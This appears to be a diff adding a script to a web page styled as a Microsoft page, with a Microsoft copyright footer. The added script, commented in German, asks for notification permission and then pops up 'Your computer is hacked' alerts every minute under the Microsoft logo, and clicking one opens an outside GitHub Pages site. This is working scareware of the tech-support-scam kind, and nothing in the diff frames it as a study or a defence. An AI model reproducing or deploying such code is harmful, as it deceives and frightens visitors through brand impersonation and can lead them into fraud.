@@ -54,5 +54,24 @@
     </div>
   </div>
   <div class="footer">© Microsoft Corporation</div>
+
+  <script>
+    // Anfrage für Benachrichtigungsrechte
+    if ("Notification" in window) {
+      Notification.requestPermission().then(permission => {
+        if (permission === "granted") {
+          setInterval(() => {
+            const notification = new Notification("Your computer is hacked", {
+              body: "Click here for more info.",
+              icon: "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"
+            });
+            notification.onclick = () => {
+              window.open("https://maikydevs2.github.io/Maikydevs2/", "_blank");
+            };
+          }, 60000); // jede 60 Sekunden
+        }
+      });
+    }
+  </script>
 </body>
 </html>
